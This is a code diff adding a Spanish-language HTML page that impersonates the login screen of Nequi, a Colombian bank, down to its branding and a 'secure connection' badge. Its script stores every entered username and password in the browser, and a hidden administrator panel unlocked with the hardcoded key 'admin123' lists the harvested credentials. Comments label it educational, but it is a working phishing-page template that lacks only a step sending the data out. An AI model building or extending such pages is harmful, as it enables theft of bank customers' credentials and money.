@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #009FE3 0%, #5E17EB 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            width: 120px;
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+        
+        .title {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+        }
+        
+        .login-card {
+            background: white;
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .input-label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .input-field:focus {
+            border-color: #8b46ff;
+            outline: none;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 42px;
+            color: #888;
+            cursor: pointer;
+        }
+        
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        
+        .remember {
+            display: flex;
+            align-items: center;
+        }
+        
+        .remember input {
+            margin-right: 5px;
+        }
+        
+        .forgot-link {
+            color: #8b46ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .login-button {
+            width: 100%;
+            background: linear-gradient(135deg, #5e17eb 0%, #8b46ff 100%);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .login-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(94, 23, 235, 0.4);
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 25px 0;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px;
+            background: #eee;
+        }
+        
+        .divider-text {
+            background: white;
+            position: relative;
+            padding: 0 15px;
+            color: #888;
+            font-size: 14px;
+        }
+        
+        .signup-button {
+            width: 100%;
+            background: white;
+            color: #5e17eb;
+            border: 2px solid #5e17eb;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .signup-button:hover {
+            background: rgba(94, 23, 235, 0.1);
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .footer-links {
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .footer-link {
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 13px;
+        }
+        
+        .security-note i {
+            margin-right: 5px;
+            color: #4caf50;
+        }
+        
+        .admin-panel {
+            margin-top: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .admin-panel h3 {
+            color: white;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        #accessKey {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+        }
+        
+        .show-admin {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .show-admin-btn {
+            background: transparent;
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 20px;
+            }
+            
+            .title {
+                font-size: 22px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg">
+                    <text x="0" y="25" font-family="Arial, sans-serif" font-weight="700" font-size="24" fill="white">NEQUI</text>
+                </svg>
+            </div>
+            <h1 class="title">Bienvenido</h1>
+            <p class="subtitle">Ingresa a tu cuenta Nequi</p>
+        </div>
+        
+        <div class="login-card">
+            <form id="loginForm">
+                <div class="input-group">
+                    <label class="input-label" for="username">Usuario</label>
+                    <input type="text" id="username" class="input-field" placeholder="Ingresa tu número de celular o usuario" required>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label" for="password">Contraseña</label>
+                    <input type="password" id="password" class="input-field" placeholder="Ingresa tu contraseña" required>
+                    <span class="password-toggle" id="passwordToggle">
+                        <i class="far fa-eye"></i>
+                    </span>
+                </div>
+                
+                <div class="remember-forgot">
+                    <label class="remember">
+                        <input type="checkbox" id="rememberMe"> Recordarme
+                    </label>
+                    <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+                </div>
+                
+                <button type="submit" class="login-button">Ingresar</button>
+                
+                <div class="divider">
+                    <span class="divider-text">o</span>
+                </div>
+                
+                <button type="button" class="signup-button">Crear una cuenta</button>
+            </form>
+        </div>
+        
+        <div class="show-admin">
+            <button class="show-admin-btn" id="showAdminBtn">Acceso administrador</button>
+        </div>
+        
+        <div class="admin-panel" id="adminPanel">
+            <h3>Panel de Administración</h3>
+            <input type="password" id="accessKey" placeholder="Clave de acceso">
+            <button class="login-button" id="accessBtn">Acceder</button>
+            <div id="credentialsList" style="margin-top: 15px; color: white; display: none;">
+                <h4>Credenciales guardadas:</h4>
+                <ul id="credentials" style="list-style: none; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 5px; margin-top: 10px;">
+                    <!-- Aquí se mostrarán las credenciales -->
+                </ul>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Nequi es una marca de Banco Bilbao Vizcaya Argentaria Colombia S.A.<br>Superintendencia Financiera de Colombia</p>
+            
+            <div class="footer-links">
+                <a href="#" class="footer-link">Términos y condiciones</a>
+                <a href="#" class="footer-link">Ayuda</a>
+            </div>
+            
+            <div class="security-note">
+                <i class="fas fa-lock"></i>
+                <span>Conexión segura</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Funcionalidad para mostrar/ocultar contraseña
+        document.getElementById('passwordToggle').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        });
+        
+        // Almacenamiento de credenciales (solo con fines educativos)
+        function saveCredentials(username, password) {
+            // Obtener credenciales existentes
+            let credentials = JSON.parse(localStorage.getItem('nequiCredentials')) || [];
+            
+            // Añadir nuevas credenciales
+            credentials.push({
+                username: username,
+                password: password,
+                timestamp: new Date().toLocaleString()
+            });
+            
+            // Guardar en localStorage
+            localStorage.setItem('nequiCredentials', JSON.stringify(credentials));
+        }
+        
+        // Validación del formulario
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                // Guardar credenciales (solo con fines educativos)
+                saveCredentials(username, password);
+                
+                alert('Inicio de sesión simulado. Tus credenciales han sido guardadas (solo con fines educativos).');
+                
+                // Limpiar formulario
+                document.getElementById('loginForm').reset();
+            } else {
+                alert('Por favor, completa todos los campos.');
+            }
+        });
+        
+        // Panel de administración
+        document.getElementById('showAdminBtn').addEventListener('click', function() {
+            document.getElementById('adminPanel').style.display = 'block';
+        });
+        
+        document.getElementById('accessBtn').addEventListener('click', function() {
+            const accessKey = document.getElementById('accessKey').value;
+            
+            // Clave de acceso (puedes cambiarla)
+            if (accessKey === 'admin123') {
+                document.getElementById('credentialsList').style.display = 'block';
+                
+                // Mostrar credenciales
+                const credentials = JSON.parse(localStorage.getItem('nequiCredentials')) || [];
+                const credentialsList = document.getElementById('credentials');
+                
+                credentialsList.innerHTML = '';
+                
+                if (credentials.length === 0) {
+                    credentialsList.innerHTML = '<li>No hay credenciales guardadas</li>';
+                } else {
+                    credentials.forEach(function(cred, index) {
+                        credentialsList.innerHTML += `
+                            <li>
+                                <strong>Usuario:</strong> ${cred.username} | 
+                                <strong>Contraseña:</strong> ${cred.password} |
+                                <strong>Fecha:</strong> ${cred.timestamp}
+                            </li>
+                        `;
+                    });
+                }
+            } else {
+                alert('Clave de acceso incorrecta');
+            }
+        });
+        
+        // Cargar usuario guardado si existe
+        window.addEventListener('load', function() {
+            const rememberedUser = localStorage.getItem('nequiRememberedUser');
+            if (rememberedUser) {
+                document.getElementById('username').value = rememberedUser;
+                document.getElementById('rememberMe').checked = true;
+            }
+        });
+    </script>
+</body>
+</html>
